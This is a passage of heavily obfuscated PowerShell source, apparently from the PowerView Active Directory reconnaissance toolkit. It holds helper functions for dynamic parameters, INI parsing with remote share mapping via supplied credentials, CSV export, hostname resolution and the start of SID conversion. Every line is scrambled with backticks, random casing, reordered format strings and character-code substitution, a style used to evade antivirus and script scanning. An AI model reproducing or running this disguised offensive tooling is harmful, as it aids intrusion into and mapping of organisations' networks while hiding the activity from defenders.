        ${s`TrUcTb`UI`Ld`ER},
        [Type[]] @([IntPtr]))
    ${il`gEN`eRAt`oR2} = ${i`mplIC`IT`C`ONvERtER}.("{3}{2}{0}{1}" -f'a','tor','etILGener','G').Invoke()
    ${ILgE`NeRa`Tor2}.("{0}{1}"-f 'E','mit').Invoke(  (&("{0}{2}{1}" -f 'v','RIAble','a')  ('9T1'+'v') -VALueO  )::"N`oP")
    ${il`Ge`Ne`RAT`or2}.("{1}{0}" -f 'it','Em').Invoke(  ${9`T1V}::"l`DAr`G_0")
    ${I`lGE`NEra`To`R2}.("{1}{0}"-f't','Emi').Invoke( (&("{2}{1}{0}"-f 'Le','Ab','vAri')  ("9"+"T1v")  )."vAl`UE"::"lDt`O`Ken", ${stRuCTBuI`ld`eR})
    ${il`G`enErAtOR2}.("{0}{1}" -f'E','mit').Invoke(  ( &("{3}{0}{1}{2}" -f'-VA','r','iaBlE','geT')  ('9T1'+'V') -vA )::"c`ALL",
          (  &("{0}{3}{2}{1}" -f'g','AbLE','VarI','eT-') ('U1V'+'PKQ') -VAl ).("{1}{2}{0}" -f 'thod','GetM','e').Invoke(("{3}{2}{0}{1}"-f'Handl','e','ypeFrom','GetT')))
    ${IlgEne`R`AtOr2}.("{1}{0}"-f 'mit','E').Invoke( ${9`T1V}::"ca`ll",
          (&("{1}{0}"-f'M','ite')  ('vari'+'A'+'Ble:duR8') )."Val`Ue".("{0}{1}" -f 'G','etMethod').Invoke(("{0}{2}{1}" -f'PtrT','ture','oStruc'), [Type[]] @([IntPtr], [Type])))
    ${ILGen`er`ATo`R2}.("{1}{0}" -f 't','Emi').Invoke( (  &("{0}{2}{1}"-f'v','aBLE','ARI') ("{0}{1}" -f '9t','1v') )."vA`LUE"::"UN`BO`x_aNy", ${ST`R`UcT`BuilD`eR})
    ${Il`Ge`NeRA`TOR2}.("{0}{1}"-f'E','mit').Invoke( (&("{2}{1}{0}" -f 'Ble','vArIa','gEt-') ("9T"+"1v")  -VaLueO  )::"r`Et")

    ${s`TR`UCtb`UiLd`ER}.("{2}{0}{1}" -f'eTyp','e','Creat').Invoke()
}

Function N`Ew-dYnami`Cp`A`RAME`TEr {

    [CmdletBinding(DefAULtPAramETERSETnaME = {"{3}{4}{2}{0}{1}"-f 'aramete','r','namicP','D','y'})]
    Param (
        [Parameter(MaNDatOrY = ${T`RUE}, VaLUeFROMPiPeLinE = ${Tr`Ue}, vALUeFRoMPipElINEBypROPerTYNAmE = ${t`Rue}, PAraMEteRSetName = "d`yNA`MI`CpArameT`er")]
        [ValidateNotNullOrEmpty()]
        [string]${N`AmE},

        [Parameter(VaLUEfRomPIpEliNEbYPROPeRtyNAME = ${Tr`Ue}, paRaMeteRSEtNAME = "D`YnaMic`PaRa`METEr")]
        [System.Type]${ty`Pe} = [int],

        [Parameter(VAlUeFRomPIpELinEbYPRopeRTYNaME = ${tr`UE}, paRAmeTeRSETNaME = "Dyn`AmiC`PaRam`E`TEr")]
        [string[]]${a`L`iaS},

        [Parameter(valuEFROMPIPELineBypRoPeRtYnaMe = ${Tr`Ue}, paraMETErSEtname = "DY`N`AmI`CPa`RaMEtER")]
        [switch]${MA`Nda`TorY},

        [Parameter(VALuefrompIPELINeBYPrOPERtyNAMe = ${T`RuE}, pARAMEteRSeTNAME = "dy`NAmI`C`pA`RAmEtER")]
        [int]${pOS`it`IOn},

        [Parameter(valuEFROmPIPeliNEBypROPErTyName = ${T`RUE}, paRamETerSetNaMe = "dYnaMI`cPAr`AM`ETeR")]
        [string]${HELPm`E`ssAGe},

        [Parameter(ValuefromPIPelinEByPRoPertYnAMe = ${t`RUE}, PaRameTERsETnAme = "dYn`A`Mic`PARa`ME`Ter")]
        [switch]${DoNts`HOw},

        [Parameter(vAlueFRoMPipEliNebYProPertYnamE = ${t`Rue}, pAraMetErsETnamE = "dynAMiC`pAR`AM`eTEr")]
        [switch]${vALuefrO`Mp`I`pEL`i`NE},

        [Parameter(vALuEFRoMPipeLineBYpROpErtynAme = ${t`RUE}, pAramETeRSETNAmE = "dYnA`mIcP`ARAM`Et`Er")]
        [switch]${va`L`U`efroM`PIPElIn`Eb`Y`pRoPER`T`YNAmE},

        [Parameter(vAluEfromPIPElIneBYPRopERtYNAme = ${t`RuE}, pArAmeteRSEtnAME = "D`yn`AMiCPAR`A`metER")]
        [switch]${VaLu`e`FRoMr`eM`Ai`NiNG`A`RguMENtS},

        [Parameter(ValuEFRoMpIPeLinEbyPRoPERTyName = ${TR`Ue}, PaRamETerSEtname = "d`YNami`cpA`RAMetER")]
        [string]${PAR`AmETErSEt`N`AMe} = "_`_allPa`RA`mEte`RSETs",

        [Parameter(vALuefRoMpiPELinEbyproPerTyNAMe = ${TR`UE}, PaRAMeteRSETName = "dyna`m`ICPARa`METEr")]
        [switch]${aLL`o`Wn`ULl},

        [Parameter(vaLuEfrompiPelinebYpRoPERTYNAMe = ${t`Rue}, paRAMeTErseTname = "dyNa`MIcp`A`RAMetEr")]
        [switch]${A`L`lO`WEmpt`ystr`INg},

        [Parameter(VAlUefrOmPiPELINEbYpROPertYnAME = ${TR`Ue}, paRametERsEtnaMe = "d`ynAmICp`A`RAMe`TeR")]
        [switch]${aLlowe`mPTY`c`Oll`eCTi`ON},

        [Parameter(vAlUEFroMPIPelINeByproPertyNAME = ${Tr`Ue}, paraMETeRsetname = "D`ynaMIcPArame`T`Er")]
        [switch]${vAli`DateN`OT`N`Ull},

        [Parameter(vaLUEfromPIPelINebYprOPErtYNamE = ${t`RuE}, PARAmetERSEtnamE = "DY`NaMICp`ArAMet`ER")]
        [switch]${Val`I`dATenOtN`ULloRe`mPTy},

        [Parameter(valueFrOMpipeLInEbyPrOperTYNAME = ${Tr`Ue}, parameTERsETnamE = "DY`NAMicp`ARAmET`ER")]
        [ValidateCount(2,2)]
        [int[]]${vaLID`A`TEcOu`NT},

        [Parameter(VaLueFroMPipELINeByPrOPertyNamE = ${TR`Ue}, pARaMETErsEtnamE = "d`yn`AM`icPar`AmeTer")]
        [ValidateCount(2,2)]
        [int[]]${V`AlIDATE`Ra`N`gE},

        [Parameter(vALuefrOMPiPeLINEBypRoPERTYnamE = ${tR`UE}, paRameteRSeTnaME = "dY`N`AmI`cParAM`ETer")]
        [ValidateCount(2,2)]
        [int[]]${V`ALiDatELeng`Th},

        [Parameter(vAlueFRomPIPelINEByPROpeRtynaME = ${t`RUe}, PARAmeTERsETName = "dYN`AMICpA`RaM`eTEr")]
        [ValidateNotNullOrEmpty()]
        [string]${vAlID`At`e`PAt`TErn},

        [Parameter(vaLUEfROmpipeLINEBypRopErtYNAMe = ${t`RUE}, paRaMeTErSeTNaME = "dyN`Ami`cPA`R`AmE`TeR")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${Va`lI`DATe`scrIPt},

        [Parameter(VALuefrOmPiPElInEbYpROpeRtYnAmE = ${TR`UE}, PARamETerSETnAmE = "Dyn`AMi`CP`A`RAmEtER")]
        [ValidateNotNullOrEmpty()]
        [string[]]${vA`lIDa`Tes`ET},

        [Parameter(vAluEFrOmPIpEliNeBYpropeRTYname = ${t`RUE}, pAraMeterseTnAMe = "dYnA`mICp`AR`AME`T`ER")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{2}{19}{22}{11}{8}{5}{13}{21}{17}{3}{4}{1}{14}{12}{18}{15}{7}{16}{9}{20}{0}{6}{10}" -f 'i','ement.Au','D','.Mana','g',' b','ctiona','dPa','st','mete','ry object','u','ime','e ','tomation.Runt','ine','ra',' System','Def','ictionary ','rD','a','m')
            }
            ${t`Rue}
        })]
        ${DiC`TI`oNa`RY} = ${f`A`LSe},

        [Parameter(mANdatOry = ${tR`Ue}, valUEfROmpIpelineBYProperTyNAme = ${tr`Ue}, PaRameTeRseTnAME = "CrE`At`EVAR`I`AblEs")]
        [switch]${crE`AT`EVAR`IA`BLES},

        [Parameter(maNdATOry = ${tR`Ue}, VAlueFrOMpiPeLinebYPrOPerTynAMe = ${TR`UE}, PARAmeteRSEtNAME = "CREa`T`evariaBlEs")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(${_}.("{0}{1}" -f 'Get','Type').Invoke()."nA`Me" -notmatch ("{3}{1}{2}{0}"-f'ary','ti','on','Dic')) {
                Throw ("{4}{11}{15}{16}{19}{12}{7}{18}{5}{10}{14}{9}{17}{3}{13}{2}{1}{8}{6}{0}" -f 'ct','y','ionar','rsDi','B','an','bje','m.',' o','SBoundPa','agement.A','oundParameters mus','te','ct','utomation.P','t',' be','ramete','M',' a Sys')
            }
            ${tr`UE}
        })]
        ${BOuNd`PaRa`METerS}
    )

    Begin {
        ${i`NT`eRN`A`ld`ictionARY} = &("{0}{2}{1}" -f 'New','ject','-Ob') -TypeName ("{9}{3}{10}{1}{6}{4}{7}{5}{2}{0}{8}"-f 'Paramete','Manag','fined','yst','mation.Ru','eDe','ement.Auto','ntim','rDictionary','S','em.')
        function _`TeMP { [CmdletBinding()] Param() }
        ${CO`MmonP`ArA`m`EtErS} = (&("{1}{3}{2}{0}"-f 'mand','G','m','et-Co') ("{1}{0}"-f'temp','_'))."PA`RAM`EtErs"."k`EYS"
    }

    Process {
        if(${creat`e`VaRIAb`LeS}) {
            ${BOun`dKE`YS} = ${bo`UnDPArAME`T`ers}."k`EyS" | &("{0}{1}{2}" -f'Where','-Obj','ect') { ${c`OMmOn`p`A`RAmETeRS} -notcontains ${_} }
            ForEach(${PaR`A`mE`TEr} in ${B`ound`keyS}) {
                if (${Pa`Ra`MEteR}) {
                    &("{2}{0}{1}{3}" -f't-','Variabl','Se','e') -Name ${paRam`e`TER} -Value ${b`OunDp`ARa`mETers}.${PA`Ra`Me`TEr} -Scope 1 -Force
                }
            }
        }
        else {
            ${STa`L`eK`eys} = @()
            ${s`T`ALEKe`YS} = ${pS`BoundpArA`m`EtE`Rs}.("{3}{2}{0}{1}" -f 'merato','r','Enu','Get').Invoke() |
                        &("{2}{1}{3}{0}{4}"-f'jec','h-O','ForEac','b','t') {
                            if(${_}."V`ALUE"."P`so`BJecT"."mE`Th`odS"."n`AmE" -match ((('^E'+'quals3JT')  -repLace([ChAR]51+[ChAR]74+[ChAR]84),[ChAR]36))) {

                                if(!${_}."va`LUe".("{1}{0}"-f's','Equal').Invoke((&("{1}{2}{0}"-f'Variable','Ge','t-') -Name ${_}."K`EY" -ValueOnly -Scope 0))) {
                                    ${_}."K`EY"
                                }
                            }
                            else {

                                if(${_}."vAl`Ue" -ne (&("{1}{0}{2}"-f'ria','Get-Va','ble') -Name ${_}."K`EY" -ValueOnly -Scope 0)) {
                                    ${_}."K`ey"
                                }
                            }
                        }
            if(${ST`AL`eKEyS}) {
                ${sTAL`ekE`ys} | &("{3}{0}{2}{1}{4}"-f'r','ch-Obje','Ea','Fo','ct') {[void]${pSBO`U`ND`ParaMET`eRS}.("{1}{0}"-f'move','Re').Invoke(${_})}
            }

            ${unBO`UnDPa`R`AM`ET`Ers} = (&("{2}{0}{1}"-f'-Comman','d','Get') -Name (${PS`cmD`leT}."MYinVoc`At`Ion"."INvo`C`A`TI`onNaME"))."pARa`Me`Te`RS".("{3}{2}{1}{0}"-f'merator','nu','etE','G').Invoke()  |

                                        &("{2}{0}{1}{3}" -f 'e-O','bjec','Wher','t') { ${_}."va`lUe"."pAra`met`Er`setS"."k`eYS" -contains ${PSc`M`DLet}.PaRaMeTErsEtNaMe } |
                                            &("{4}{1}{3}{0}{2}"-f'Ob','t','ject','-','Selec') -ExpandProperty ("{1}{0}"-f 'ey','K') |

                                                &("{0}{1}{2}"-f 'Where','-Obj','ect') { ${p`SB`O`UNdPaRAmETE`RS}."k`eYs" -notcontains ${_} }

            ${T`mP} = ${N`UlL}
            ForEach (${p`ARa`mEteR} in ${UN`BoUndp`AR`AmET`eRs}) {
                ${De`FAu`L`TValUE} = &("{1}{2}{3}{0}" -f 'le','Get-V','aria','b') -Name ${PA`Ra`meter} -ValueOnly -Scope 0
                if(!${psb`ouNdParA`mET`eRs}."Tr`YGEtv`AlUE"(${p`A`Ra`meTeR}, [ref]${T`mP}) -and ${dEFa`ULt`VAlUe}) {
                    ${psBOuN`d`p`ARAME`Ters}.${PARAM`et`eR} = ${DEF`AUl`TVa`lue}
                }
            }

            if(${D`IctiO`NaRy}) {
                ${dpDi`Ction`Ary} = ${D`I`cTionaRy}
            }
            else {
                ${D`PDIct`iO`N`ArY} = ${Inte`RNa`lDicTIo`NArY}
            }

            ${g`e`TVaR} = {&("{0}{2}{1}"-f 'Ge','riable','t-Va') -Name ${_} -ValueOnly -Scope 0}

            ${A`Ttr`ib`Ut`erEGEx} = (('^('+'Ma'+'nda'+'tory5UcPo'+'si'+'ti'+'on5U'+'cPa'+'ra'+'meterSet'+'Name5UcDontS'+'how5'+'UcH'+'elp'+'Messa'+'g'+'e5U'+'c'+'Val'+'ueFro'+'mP'+'ipel'+'i'+'ne5UcValue'+'From'+'Pipeli'+'neByProperty'+'N'+'ame5'+'UcValu'+'eFromRema'+'iningAr'+'gum'+'ent'+'s)AyV')."REpLA`cE"(([CHar]53+[CHar]85+[CHar]99),'|')."REplA`CE"(([CHar]65+[CHar]121+[CHar]86),[sTRiNG][CHar]36))
            ${VA`LId`At`Io`NReGEX} = ((('^(Allow'+'Nul'+'lyw'+'J'+'AllowEmptyStri'+'ng'+'ywJA'+'l'+'lowE'+'mptyColle'+'cti'+'ony'+'wJValidateCou'+'ntywJV'+'al'+'id'+'ateLe'+'n'+'gth'+'ywJVali'+'d'+'ateP'+'at'+'ter'+'n'+'ywJValidat'+'e'+'Ra'+'ngey'+'wJV'+'al'+'idate'+'Scr'+'i'+'p'+'tywJVa'+'l'+'idateSet'+'y'+'w'+'JValidateN'+'otNul'+'lywJ'+'Validate'+'N'+'otNu'+'llO'+'rEmpty)g5J')-crEPlaCE ([CHaR]103+[CHaR]53+[CHaR]74),[CHaR]36-REpLAcE ([CHaR]121+[CHaR]119+[CHaR]74),[CHaR]124))
            ${alia`Sr`eg`ex} = {('^Alia'+'sk'+'Uu').("{0}{1}"-f 'R','eplACE').Invoke('kUu','$')}
            ${P`ARam`eTErAtTr`IB`UtE} = &("{0}{1}{2}"-f 'N','ew-Objec','t') -TypeName ("{3}{8}{1}{2}{11}{7}{0}{9}{5}{12}{13}{10}{4}{6}"-f'm','M','anag','S','ib','n.Pa','ute','ment.Auto','ystem.','atio','r','e','ram','eterAtt')

            switch -regex (${P`sboundP`ArAmeTe`RS}."k`eyS") {
                ${a`T`TrIbu`TeREgEX} {
                    Try {
                        ${pArAm`etERaT`T`RIB`U`Te}.${_} = . ${g`e`TVar}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${dP`dICtioNA`Ry}."KE`yS" -contains ${N`AmE}) {
                ${dP`d`IcTIO`N`ARy}.${N`Ame}."ATt`RiBU`TeS".("{0}{1}" -f 'Ad','d').Invoke(${P`ArAmetEr`AtTR`ibU`Te})
            }
            else {
                ${a`TTRIbUTEcOl`l`eC`T`IoN} = &("{1}{2}{0}" -f 'ject','N','ew-Ob') -TypeName ("{10}{13}{0}{6}{12}{9}{3}{11}{4}{5}{8}{14}{2}{7}{1}" -f'ti',']','u','ectMo','el.Co','lle','on','te','ction[System.','j','Coll','d','s.Ob','ec','Attrib')
                switch -regex (${pSB`OUnDp`Ara`mEteRS}."K`eYs") {
                    ${VaL`IDA`TIOnr`EGEX} {
                        Try {
                            ${Pa`RAMeTe`ROp`T`IOnS} = &("{0}{1}{2}"-f 'New-Obje','c','t') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${G`eTV`AR}) -ErrorAction ("{1}{0}" -f'op','St')
                            ${at`Tr`iB`UtE`CoL`L`ectioN}.("{1}{0}"-f 'd','Ad').Invoke(${PArAm`EtE`Ro`ptiONS})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${Ali`A`sr`Egex} {
                        Try {
                            ${p`Arametera`lias} = &("{0}{1}{2}" -f'New-Obj','e','ct') -TypeName ("{10}{11}{0}{7}{5}{12}{1}{8}{4}{3}{9}{2}{6}"-f'stem.','gement.Auto','ttri','n.Ali','atio','a','bute','M','m','asA','S','y','na') -ArgumentList (. ${g`ETVAR}) -ErrorAction ("{1}{0}"-f'p','Sto')
                            ${a`Ttr`IBUt`e`cOLLeCTION}.("{1}{0}" -f 'dd','A').Invoke(${p`ARAmeteRaL`IaS})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${ATTR`i`ButEC`OLlecti`ON}.("{0}{1}"-f'A','dd').Invoke(${paR`AmEt`e`RA`TT`RIbu`Te})
                ${P`A`RAMeTER} = &("{2}{0}{1}"-f 'w-Objec','t','Ne') -TypeName ("{4}{10}{13}{12}{6}{9}{14}{2}{11}{7}{1}{0}{5}{3}{8}" -f'eDefinedParam','m','n.','t','System.','e','t','nti','er','o','M','Ru','ement.Au','anag','matio') -ArgumentList @(${NA`mE}, ${T`yPe}, ${A`T`T`RIBU`TE`Co`llEcTiOn})
                ${Dp`dICTI`O`NArY}.("{1}{0}"-f 'dd','A').Invoke(${N`Ame}, ${paR`A`M`eTER})
            }
        }
    }

    End {
        if(!${crE`ATevA`RIa`BL`eS} -and !${dI`CtIo`Na`RY}) {
            ${dp`DIC`TIo`NAry}
        }
    }
}

function ge`T-I`NIcO`NtE`NT {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{4}{0}" -f 's','PS','Shou','ldProc','es'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIon = 0, mandAtORy = ${t`RUe}, ValuefROMpipELiNE = ${t`RuE}, vALuEFroMpipelineByPRopErTyName = ${t`RuE})]
        [Alias({"{1}{2}{0}"-f'ame','Ful','lN'}, {"{1}{0}"-f 'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PA`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`D`eNtIal} =   (&("{0}{2}{1}"-f'vARiAb','e','l') ("{1}{0}" -f 'zN','PkFe') )."V`AlUE"::"em`pTY",

        [Switch]
        ${OutPuT`oB`Ject}
    )

    BEGIN {
        ${mAp`peDcOmpu`Te`Rs} = @{}
    }

    PROCESS {
        ForEach (${TA`R`GetPa`Th} in ${p`AtH}) {
            if ((${tArget`P`ATH} -Match ((("{2}{3}{4}{1}{0}"-f'*','.','tWztW','ztWz','tWz.*tWztWz'))."RepL`ACe"(([chAr]116+[chAr]87+[chAr]122),[strinG][chAr]92))) -and (${p`S`BOUNdparA`MeTE`RS}[("{1}{0}{2}"-f 'en','Cred','tial')])) {
                ${hoStCom`p`UTer} = (&("{2}{3}{1}{0}" -f'ect','j','Ne','w-Ob') ("{2}{0}{1}"-f 'stem.U','ri','Sy')(${Ta`RGet`p`Ath}))."Ho`st"
                if (-not ${m`APPe`d`cOMPUTeRS}[${h`OSTc`Omp`UTer}]) {

                    &("{0}{2}{1}{4}{3}"-f 'Add-R','e','emoteConn','n','ctio') -ComputerName ${HO`STC`omP`UTer} -Credential ${C`Re`dENtIAL}
                    ${MaPp`E`DcOMp`UTeRS}[${hoSTcOm`P`Ut`eR}] = ${Tr`UE}
                }
            }

            if (&("{1}{0}{2}"-f'e','T','st-Path') -Path ${TaRgE`TpA`Th}) {
                if (${pS`BounD`parA`m`ETERs}[("{1}{0}{3}{2}" -f'utO','Outp','t','bjec')]) {
                    ${InIOB`je`CT} = &("{2}{0}{1}{3}" -f'w-O','bj','Ne','ect') ("{1}{0}{2}" -f 'SOb','P','ject')
                }
                else {
                    ${in`ioB`JeCt} = @{}
                }
                Switch -Regex -File ${t`A`R`gETpath} {
                    ((("{1}{2}{0}"-f '(.+)hEU]','^h','EU[')) -Creplace 'hEU',[cHAR]92) 
                    {
                        ${sE`Ct`IOn} = ${m`ATcH`eS}[1].("{1}{0}"-f 'm','Tri').Invoke()
                        if (${pS`BO`Un`dp`A`RAmETeRS}[("{3}{0}{1}{2}"-f 'put','Objec','t','Out')]) {
                            ${seCt`i`on} = ${SEcT`i`on}.("{1}{0}"-f'eplace','R').Invoke(' ', '')
                            ${sE`C`TIOn`OB`jECT} = &("{1}{2}{0}"-f 'ect','Ne','w-Obj') ("{1}{0}{2}"-f 'SObjec','P','t')
                            ${I`Ni`obJE`ct} | &("{1}{2}{0}"-f'ember','Ad','d-M') ("{0}{2}{1}"-f 'Notep','operty','r') ${S`ECT`iON} ${Se`CtIoNoB`JeCt}
                        }
                        else {
                            ${i`Niobj`ect}[${SE`c`TiOn}] = @{}
                        }
                        ${c`oMM`enTCOu`NT} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${v`A`LuE} = ${Ma`Tc`hEs}[1].("{1}{0}"-f 'm','Tri').Invoke()
                        ${Com`M`EnTCoU`Nt} = ${c`omMEn`T`coUNT} + 1
                        ${na`mE} = ("{0}{2}{1}"-f 'Co','ent','mm') + ${COM`meNt`c`Ou`Nt}
                        if (${ps`BOu`NDpa`RAME`TERs}[("{1}{0}{3}{2}"-f'u','O','ct','tputObje')]) {
                            ${Na`me} = ${na`me}.("{0}{2}{1}"-f 'Re','ace','pl').Invoke(' ', '')
                            ${Inio`B`JeCt}.${Se`CtI`On} | &("{1}{0}{2}" -f'dd-Me','A','mber') ("{1}{2}{3}{0}"-f'rty','N','ote','prope') ${N`AmE} ${V`A`lUE}
                        }
                        else {
                            ${iniO`Bj`ECT}[${Se`c`TIoN}][${nA`mE}] = ${v`Al`UE}
                        }
                    }
                    ((("{2}{4}{0}{1}{5}{3}" -f'?)','{','(.','}s*=(.*)','+','0')) -F  [CHar]92) 
                    {
                        ${nA`mE}, ${Va`lUE} = ${Ma`TcHES}[1..2]
                        ${N`AME} = ${N`Ame}.("{1}{0}" -f'rim','T').Invoke()
                        ${vaLu`es} = ${va`lue}.("{1}{0}" -f 'it','spl').Invoke(',') | &("{2}{1}{3}{0}"-f't','ch-Obje','ForEa','c') { ${_}.("{1}{0}" -f 'rim','T').Invoke() }

                        if (${PSboUnDPA`RaM`E`T`eRS}[("{3}{2}{1}{0}"-f'ject','b','utputO','O')]) {
                            ${N`AmE} = ${N`AMe}.("{1}{0}"-f 'e','Replac').Invoke(' ', '')
                            ${INiO`BJ`ect}.${SECTi`ON} | &("{2}{1}{0}"-f'Member','-','Add') ("{0}{1}{2}{3}"-f'No','tepro','pert','y') ${N`AMe} ${VALu`eS}
                        }
                        else {
                            ${In`iOb`JECt}[${SEc`TI`on}][${Na`ME}] = ${v`Alu`eS}
                        }
                    }
                }
                ${IN`IO`BJ`ECt}
            }
        }
    }

    END {

        ${mAPp`EDC`omPuTeRS}."K`EYS" | &("{1}{3}{5}{0}{2}{4}{6}"-f 'emot','R','eC','em','onnectio','ove-R','n')
    }
}

function ex`P`O`Rt-poWER`ViewcsV {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f 'P','dP','rocess','SShoul'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(mandatORY = ${T`Rue}, VaLuefroMpIPElInE = ${tr`Ue}, vALUeFRompIpELiNebYproPeRtYNAme = ${tr`UE})]
        [System.Management.Automation.PSObject[]]
        ${InPUT`obJ`ECT},

        [Parameter(mANdATORy = ${Tr`UE}, PosiTIon = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${pa`TH},

        [Parameter(pOsItIon = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${de`L`IMiTer} = ',',

        [Switch]
        ${aPP`eND}
    )

    BEGIN {
        ${O`UtPuTpA`Th} =  ${X2`yp}::"g`eTFU`llpaTH"(${PsbOundpa`RAm`et`eRS}[("{0}{1}" -f 'Pat','h')])
        ${Ex`I`STs} =  (  &("{0}{1}{2}"-f 'VaRiA','B','lE')  ('9r3xK'+'v') )."VAl`Ue"::("{1}{0}" -f 'sts','Exi').Invoke(${o`UTp`UtPATh})

        ${M`UTex} = &("{1}{3}{0}{2}" -f'e','New','ct','-Obj') ("{3}{1}{2}{4}{0}"-f 'x','stem.Thre','adi','Sy','ng.Mute') ${F`AL`se},("{1}{0}{2}"-f 'VMut','CS','ex')
        ${n`Ull} = ${M`UtEX}.("{0}{1}"-f 'W','aitOne').Invoke()

        if (${psbouNd`P`A`RameTe`RS}[("{0}{1}"-f 'A','ppend')]) {
            ${fI`leMo`De} =   ${cU2`lv3}::"AP`PEnd"
        }
        else {
            ${fI`l`eMode} =  ( &("{0}{1}" -f 'ITE','m')  ("VarIab"+"L"+"E:c"+"U2Lv3"))."V`ALuE"::"c`REaTe"
            ${e`xIs`Ts} = ${F`ALSE}
        }

        ${C`svs`TREAM} = &("{0}{1}{2}" -f'New-','Ob','ject') ("{0}{2}{1}" -f 'I','ileStream','O.F')(${o`UTPUTP`ATH}, ${f`iLeMo`De},  (  &("{1}{2}{0}" -f 'E','Va','riAbl') ("LVda"+"6F"))."vA`Lue"::"Wr`iTE",  (  &('ls') ("{1}{2}{3}{0}" -f 'h','Var','IABLE:f','q'))."VAL`Ue"::"R`eAd")
        ${cS`VWRi`Ter} = &("{2}{0}{1}"-f 'Objec','t','New-') ("{4}{3}{2}{6}{5}{1}{0}"-f'r','e','.Stream','.IO','System','it','Wr')(${C`svS`TRE`Am})
        ${cs`V`Wri`Ter}."AutoF`LU`Sh" = ${t`RUe}
    }

    PROCESS {
        ForEach (${E`NT`Ry} in ${I`N`PuTobjECt}) {
            ${O`BJE`CTCsv} = &("{2}{0}{1}{3}"-f'r','tTo-Cs','Conve','v') -InputObject ${E`NTry} -Delimiter ${de`liM`IteR} -NoTypeInformation

            if (-not ${e`x`istS}) {

                ${ObJe`cTc`SV} | &("{1}{0}{2}" -f'rEach-O','Fo','bject') { ${C`SvWRi`TEr}.("{0}{2}{1}"-f'Wr','eLine','it').Invoke(${_}) }
                ${e`XIsTS} = ${TR`Ue}
            }
            else {

                ${O`BJ`eCt`CsV}[1..(${oBJe`C`TcSV}."lE`Ng`Th"-1)] | &("{0}{2}{3}{1}"-f'F','ject','o','rEach-Ob') { ${csv`w`R`ItEr}.("{1}{2}{0}" -f'e','W','riteLin').Invoke(${_}) }
            }
        }
    }

    END {
        ${muT`eX}.("{1}{2}{0}"-f 'Mutex','Releas','e').Invoke()
        ${Cs`V`WriT`ER}.("{1}{0}{2}" -f 's','Di','pose').Invoke()
        ${cS`VS`TreAM}.("{1}{0}" -f'ispose','D').Invoke()
    }
}

function re`Sol`VE-I`PA`DDrEss {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{3}{1}" -f 'PSShou','s','ce','s','ldPro'}, '')]
    [OutputType({"{6}{10}{3}{0}{9}{5}{4}{7}{1}{8}{2}"-f'ag','n.PSCustomObj','ct','.Man','.Automati','nt','S','o','e','eme','ystem'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITion = 0, vAlUEFRompipELiNE = ${t`RUE}, VAlUEfrOmPiPEliNEbYpRopERtYNAme = ${T`RUe})]
        [Alias({"{0}{1}"-f'Host','Name'}, {"{2}{0}{1}"-f'nshostnam','e','d'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COm`pUt`eR`NamE} = ${eNv:`COmpU`TEr`N`Ame}
    )

    PROCESS {
        ForEach (${coM`p`Ut`Er} in ${Co`m`PUT`ern`AmE}) {
            try {
                @(( ( &("{0}{2}{1}"-f 'get','Ble','-varIa')  ("{1}{0}" -f'3CJ','5L')  )."vaL`Ue"::("{2}{1}{3}{0}"-f'ry','tHos','Ge','tEnt').Invoke(${COmPU`Ter}))."AdDR`eSsL`isT") | &("{3}{1}{4}{0}{2}" -f'b','rEach','ject','Fo','-O') {
                    if (${_}."ADdR`eS`SfAMily" -eq ("{1}{0}{3}{2}"-f 'nter','I','rk','Netwo')) {
                        ${O`Ut} = &("{2}{0}{1}"-f'ew-Ob','ject','N') ("{2}{1}{0}" -f 'bject','SO','P')
                        ${O`Ut} | &("{0}{1}{2}"-f'A','dd-M','ember') ("{1}{0}{3}{2}" -f 'ote','N','y','propert') ("{1}{0}{2}" -f 'om','C','puterName') ${ComPut`Er}
                        ${O`Ut} | &("{1}{0}{2}" -f'dd-Memb','A','er') ("{3}{2}{1}{0}"-f'erty','prop','te','No') ("{1}{0}"-f'ress','IPAdd') ${_}."ipa`DdreSST`Os`Tring"
                        ${O`Ut}
                    }
                }
            }
            catch {
                &("{1}{2}{0}"-f'e','Wr','ite-Verbos') ('[R'+'e'+'sol'+'v'+'e-IPAdd'+'re'+'ss] '+'Coul'+'d '+'n'+'ot '+'res'+'olve '+"$Computer "+'to'+' '+'a'+'n '+'IP'+' '+'A'+'ddr'+'ess.')
            }
        }
    }
}

function cOn`VerTTo-`S`iD {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}"-f 'PS','ss','ShouldProce'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MandaTORY = ${TR`Ue}, vALuEfRompipELINe = ${T`RUe}, VALueFROMPIpELinEbyPrOpErTYname = ${T`RUe})]
        [Alias({"{1}{0}" -f'e','Nam'}, {"{0}{1}{2}" -f'Ident','it','y'})]
        [String[]]
        ${O`BjeC`TnAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`om`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}{4}" -f'omai','nCo','ntroll','D','er'})]
        [String]
        ${SE`RveR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
